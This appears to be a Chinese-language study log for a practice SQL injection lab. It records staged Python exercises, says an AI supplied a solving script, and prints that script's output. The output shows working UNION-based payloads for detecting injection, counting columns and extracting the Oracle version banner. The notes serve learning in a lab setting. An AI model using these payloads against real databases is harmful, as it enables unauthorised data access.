
## lv1
自己練習python
第一階段先能訪問成功

這邊發現Session()的S要大寫
雖然session的方法點進去也是直接呼叫Session()
但AI表示大寫比較常見, 官方好像也都用大寫

## lv2
自己練習python
第2階段可偵測union欄位
主要了解find_columns這個方法的實作

## lv3
研究main.py是如何組出union
主要了解python的join是如何運行的

## lv4
自己手打的code完整版並且破題

## lv5 
研究如何寫出通用的`找version資訊`方法


## main.py
ai給的方法，也可破題

以下為`main.py`的output
```!
[*] 偵測 SQLi
    [Payload] Gifts
    [Payload] ' OR 1=1 -- 
[+] 目標可能存在 SQLi
[*] 偵測欄位數
    [Payload] ' UNION SELECT NULL from dual  --  
    [Payload] ' UNION SELECT NULL,NULL from dual  --  
[+] 欄位數 = 2
[*] 偵測可回顯欄位
    [Payload] ' UNION SELECT 'DISP_COL_TEST',NULL from dual -- 
[+] 可回顯欄位索引 = 1
[*] 偵測 DBMS
    [Payload] ' UNION SELECT banner,NULL FROM v$version -- 
[+] DBMS = Oracle
[*] 取得 DB 版本
    [Payload] ' UNION SELECT banner,NULL FROM v$version -- 
[+] DB Version = Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```